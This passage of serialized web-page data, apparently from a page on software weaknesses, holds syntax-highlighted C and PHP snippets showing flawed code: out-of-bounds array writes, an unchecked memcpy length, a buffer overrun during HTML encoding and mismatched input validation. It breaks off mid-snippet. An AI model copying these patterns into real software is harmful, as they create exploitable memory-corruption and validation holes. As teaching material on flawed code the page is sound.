};\\n}\\n\"}}]]}],[\"$\",\"body\",null,{\"children\":[\"$\",\"$Lf\",null,{\"children\":[[\"$\",\"$L10\",null,{}],[\"$\",\"$Lc\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"loadingScripts\":\"$undefined\",\"hasLoading\":false,\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Le\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[\"$\",\"div\",null,{\"id\":\"notfound\",\"children\":[[\"$\",\"img\",null,{\"alt\":\"img\",\"src\":\"/images/cry.gif\"}],[\"$\",\"code\",null,{\"id\":\"notfound-404\",\"children\":\"404\"}],[\"$\",\"code\",null,{\"id\":\"notfound-text\",\"children\":\"Page Not Found\"}]]}],\"notFoundStyles\":[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/98e601cf5ba3633d.css\",\"precedence\":\"next\",\"crossOrigin\":\"\"}]],\"styles\":null}]]}]}]]}],null]],\"initialHead\":[false,\"$L11\"],\"globalErrorComponent\":\"$12\",\"missingSlots\":\"$W13\"}]]\n"])</script><script>self.__next_f.push([1,"14:I[74365,[\"481\",\"static/chunks/457b8330-b5c9cf3fcf214847.js\",\"954\",\"static/chunks/d3ac728e-0c798b3b8aa3bf53.js\",\"250\",\"static/chunks/250-0ef8476c0fa8ee24.js\",\"612\",\"static/chunks/612-fa632c1349770315.js\",\"551\",\"static/chunks/551-19232c47cd1e883a.js\",\"842\",\"static/chunks/842-812b9489b5c7f4d9.js\",\"877\",\"static/chunks/app/%5B...slug%5D/page-5eb8e12f7c16248f.js\"],\"\"]\n15:I[62029,[\"481\",\"static/chunks/457b8330-b5c9cf3fcf214847.js\",\"954\",\"static/chunks/d3ac728e-0c798b3b8aa3bf53.js\",\"250\",\"static/chunks/250-0ef8476c0fa8ee24.js\",\"612\",\"static/chunks/612-fa632c1349770315.js\",\"551\",\"static/chunks/551-19232c47cd1e883a.js\",\"842\",\"static/chunks/842-812b9489b5c7f4d9.js\",\"877\",\"static/chunks/app/%5B...slug%5D/page-5eb8e12f7c16248f.js\"],\"\"]\n16:T4dc,\u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e id_sequence\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token number\"\u003e3\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e/* Populate the id array. */\u003c/span\u003e\n\nid_sequence\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token number\"\u003e123\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\nid_sequence\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token number\"\u003e234\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\nid_sequence\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token number\"\u003e345\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\nid_sequence\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token number\"\u003e3\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token number\"\u003e456\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n17:T674,\u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e \u003cspan class=\""])</script><script>self.__next_f.push([1,"token function\"\u003ereturnChunkSize\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003evoid\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token comment\"\u003e/* if chunk info is valid, return the size of usable memory,\n    * else, return -1 to indicate an error.\n    */\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e \u003cspan class=\"token function\"\u003emain\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003ememcpy\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003edestBuf\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e srcBuf\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003ereturnChunkSize\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003edestBuf\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n18:T14c4,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token function\"\u003ecopy_input\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003euser_supplied_string\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e i\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e dst_index\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003edst_buf \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token function\"\u003emalloc\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e4\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token keyword\"\u003esizeof\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e MAX_SIZE\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eMAX_SIZE \u003cspan class=\"token operator\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan class=\"token function\"\u003estrlen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003euser_supplied_string\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token function\"\u003edie\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"user string too long, die evil hacker!\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    dst_index \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ei \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e i \u003cspan class=\"token operator\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"token function\"\u003estrlen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003euser_supplied_string\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e i\u003cspan class=\"token operator\"\u003e++\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token char\"\u003e'\u0026amp;'\u003c/span\u003e \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e user_supplied_string\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003ei\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n            dst_buf\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003edst_index\u003cspan class=\"token operator\"\u003e++\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token char\"\u003e'\u0026amp;'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n            dst_buf\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003edst_index\u003cspan class=\"token operator\"\u003e++\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token char\"\u003e'a'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n            dst_buf\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003edst_index\u003cspan class=\"token operator\"\u003e++\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token char\"\u003e'm'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n            dst_buf\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003edst_index\u003cspan class=\"token operator\"\u003e++\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token char\"\u003e'p'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n            dst_buf\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003edst_index\u003cspan class=\"token operator\"\u003e++\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token char\"\u003e';'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token char\"\u003e'\u0026lt;'\u003c/span\u003e \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e user_supplied_string\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003ei\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"token comment\"\u003e/* encode to \u0026amp;lt; */\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\n            dst_buf\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003edst_index\u003cspan class=\"token operator\"\u003e++\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e user_supplied_string\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003ei\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e dst_buf\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"19:T12e7,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e!\u003c/span\u003ectx\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003ein_seek\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003esize \u003cspan class=\"token operator\"\u003e\u003e\u003c/span\u003e remain\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token function\"\u003eGF_LOG\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eGF_LOG_WARNING\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e GF_LOG_MEDIA\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"[MP3Dmx] truncated frame of size %u (remains %u)\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e size\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e remain\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ebytes_skipped \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e size \u003cspan class=\"token operator\"\u003e\u003e\u003c/span\u003e remain\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token function\"\u003eGF_LOG\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eGF_LOG_WARNING\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e GF_LOG_MEDIA\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"[MP3Dmx] truncated frame of size %u (remains %d)\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e size\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e remain\u003cspan class=\"token operator\"\u003e-\u003c/span\u003ebytes_skipped\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ebreak\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    dst_pck \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003egf_filter_pck_new_alloc\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ectx\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003eopid\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e size\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u0026amp;\u003c/span\u003eoutput\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e!\u003c/span\u003edst_pck\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003ebreak\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003ememcpy\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eoutput\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e sync\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e size\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003egf_filter_pck_set_cts\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003edst_pck\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e ctx\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003ects\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003egf_filter_pck_set_duration\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003edst_pck\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e nb_samp\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003egf_filter_pck_set_sap\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003edst_pck\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e GF_FILTER_SAP_1\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003egf_filter_pck_set_framing\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003edst_pck\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e GF_TRUE\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e GF_TRUE\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ectx\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003ebyte_offset \u003cspan class=\"token operator\"\u003e!=\u003c/span\u003e GF_FILTER_NO_BO\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token function\"\u003egf_filter_pck_set_byte_offset\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003edst_pck\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e ctx\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003ebyte_offset \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e bytes_skipped\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003egf_filter_pck_send\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003edst_pck\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"1a:Tc8c,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token variable\"\u003e$nat_id\u003c/span\u003e   \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$_POST\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'id'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e               \u003cspan class=\"token comment\"\u003e// nat id\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$nat_type\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$_POST\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'type'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e             \u003cspan class=\"token comment\"\u003e// src, dst\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e// validate object type\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e!\u003c/span\u003e\u003cspan class=\"token function\"\u003ein_array\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$obj_type\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'subnets'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string single-quoted-string\"\u003e'ipaddresses'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$Result\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003e\u003cspan class=\"token function\"\u003eshow\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"danger\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token function\"\u003e_\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"Invalid object type\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token constant boolean\"\u003etrue\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e// validate object id\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e!\u003c/span\u003e\u003cspan class=\"token function\"\u003eis_numeric\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$obj_id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$Result\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003e\u003cspan class=\"token function\"\u003eshow\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"danger\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token function\"\u003e_\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"Invalid object id\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token constant boolean\"\u003etrue\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"1b:T12af,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token macro property\"\u003e\u003cspan class=\"token directive-hash\"\u003e#\u003c/span\u003e\u003cspan class=\"token directive keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"token string\"\u003e\u0026lt;stdio.h\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token macro property\"\u003e\u003cspan class=\"token directive-hash\"\u003e#\u003c/span\u003e\u003cspan class=\"token directive keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"token string\"\u003e\u0026lt;unistd.h\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token macro property\"\u003e\u003cspan class=\"token directive-hash\"\u003e#\u003c/span\u003e\u003cspan class=\"token directive keyword\"\u003edefine\u003c/span\u003e \u003cspan class=\"token macro-name\"\u003eBUFSIZER1\u003c/span\u003e \u003cspan class=\"token expression\"\u003e\u003cspan class=\"token number\"\u003e512\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token macro property\"\u003e\u003cspan class=\"token directive-hash\"\u003e#\u003c/span\u003e\u003cspan class=\"token directive keyword\"\u003edefine\u003c/span\u003e \u003cspan class=\"token macro-name\"\u003eBUFSIZER2\u003c/span\u003e \u003cspan class=\"token expression\"\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eBUFSIZER1 \u003cspan class=\"token operator\"\u003e/\u003c/span\u003e \u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e \u003cspan class=\"token number\"\u003e8\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e \u003cspan class=\"token function\"\u003emain\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003eint\u003c/span\u003e argc\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token operator\"\u003e*\u003c/span\u003eargv\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    